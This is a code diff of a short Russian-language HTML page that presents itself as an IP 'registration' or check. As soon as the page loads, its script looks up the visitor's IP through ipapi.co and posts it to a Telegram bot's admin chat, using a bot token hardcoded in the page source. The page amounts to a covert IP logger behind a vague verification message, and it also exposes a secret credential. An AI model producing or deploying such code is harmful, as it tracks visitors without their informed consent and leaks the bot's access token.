@@ -1,32 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Регистрация в Telegram</title>
+  <title>Регистрация IP</title>
 </head>
 <body>
-<h2>Регистрация студента</h2>
-<p>Подождите, идёт проверка IP...</p>
+<h2>Регистрация IP</h2>
+<p>Подождите, идёт проверка...</p>
 
 <script>
 async function sendIP() {
     try {
-        // Получаем IP пользователя через ipapi.co (работает с CORS)
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
+        // Получаем IP
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
         const ip = data.ip;
 
-        // Отправляем IP боту через Telegram Web App
-        Telegram.WebApp.sendData(ip);
+        // Отправляем IP боту напрямую через Bot API
+        const BOT_TOKEN = "8456230167:AAHCaeyIsgjBRaBvZ_4Q29awaUv4Ikd3rzw";
+        const ADMIN_ID = 1040339009; // Для теста можно ваш ID
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: ADMIN_ID,
+                text: `Новый IP: ${ip}`
+            })
+        });
 
-        // Закрываем Web App после отправки
-        Telegram.WebApp.close();
+        document.body.innerHTML = "<p>IP проверен!</p>";
     } catch (err) {
         console.error(err);
-        document.body.innerHTML = "<p>Ошибка при получении IP. Попробуйте ещё раз.</p>";
+        document.body.innerHTML = "<p>Ошибка при проверке IP.</p>";
     }
 }
 
-// Запускаем функцию при загрузке страницы
 sendIP();
 </script>
 </body>
